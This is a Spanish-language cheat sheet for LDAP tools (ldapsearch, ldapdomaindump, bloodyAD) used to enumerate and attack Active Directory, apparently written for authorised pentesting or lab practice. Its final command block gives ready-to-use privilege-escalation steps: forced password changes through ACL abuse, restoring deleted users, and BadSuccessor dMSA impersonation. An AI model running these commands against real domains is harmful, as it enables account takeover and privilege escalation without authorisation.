---
title: Herramientas LDAP (ldapsearch / ldapdomaindump / bloodyAD)
resumen: Consulta y, en el caso de bloodyAD, escritura directa sobre el directorio vía LDAP (389/636).
tags: enumeration
---

## ldapsearch

```bash
# Enumeración de usuarios sin credenciales
ldapsearch -x -H 'ldap://10.10.10.10' -b "DC=domain,DC=local" "(objectClass=user)" userPrincipalName

# Enumeración de usuarios con credenciales
ldapsearch -x -H ldap://10.10.10.10 -D "USER@domain.local" -w "PASSWORD" -b "DC=DOMAIN,DC=LOCAL" "(objectClass=user)" userPrincipalName

# Enumeración de grupos con credenciales
ldapsearch -x -H ldap://10.10.10.10 -b "DC=domain,DC=local" "(objectClass=group)" cn member

# LDAPS (puerto 636)
ldapsearch -x -H ldaps://10.10.10.10 -D "USER@domain.local" -w "PASSWORD" -b "DC=domain,DC=local"
```

## ldapdomaindump

Vuelca la enumeración completa del dominio a HTML/JSON para revisarla cómodamente.

```bash
ldapdomaindump -u 'dominio\usuario' -p 'contraseña' 10.10.10.10
```

> Los `.json` se pueden inspeccionar por CLI con `jq`, o levantar un servidor local (`python3 -m http.server`) y ver los `.html` generados desde el navegador.

## bloodyAD

Realiza llamadas LDAP firmadas específicas contra un DC para escalada de privilegios de AD — no solo consulta, también puede escribir.

```bash
-- CONSULTAS --
# Permisos de escritura sobre objetos
bloodyAD -u usuario -p 'contraseña' -d bloody.local --host IP get writable --detail

# Igual, usando un ticket en memoria (PtT)
bloodyAD -k ccache=usuario.ccache -d bloody.local --host NETBIOS --dc-ip IP get writable --right WRITE

# Listar usuarios y sus grupos
bloodyAD -u usuario -p 'contraseña' -d bloody.local --host IP get search --filter '(objectClass=user)' --attr sAMAccountName,memberOf

# Objetos borrados
bloodyAD -u usuario -p 'contraseña' -d bloody.local --host IP get children --target 'CN=Deleted Objects,DC=bloody,DC=local'
```

```bash
-- ACCIONES --
# Restaurar usuario borrado (Tombstone Reanimation)
bloodyAD -u usuario -p 'contraseña' -d bloody.local --host IP set restore "CN=Usuario borrado\...,CN=Deleted Objects,DC=bloody,DC=local"

# Cambiar contraseña a un usuario (abuso de ACL tipo ForceChangePassword)
bloodyAD -u usuario -p 'contraseña' --host IP -d bloody.local set password usuario_objetivo 'contraseña_nueva'

# BadSuccessor: suplantar cuenta de servicio vía dMSA (PtT)
bloodyAD -k ccache=usuario.ccache --dc-ip IP --host dc01.bloody.local -d bloody.local \
  add badSuccessor userdMSA -t "CN=svc_user,OU=ServiceAccounts,DC=bloody,DC=local" --ou "OU=MSAHolder,DC=bloody,DC=local"
```

```bash
# Instalación
python3 -m venv ~/bloody_env
source ~/bloody_env/bin/activate
pip install bloodyAD
```

### Técnicas donde aparece

[[enumeracion-ldap]] · [[abuse-acl]] · [[tombstone-reanimation]] · [[badsuccessor]]
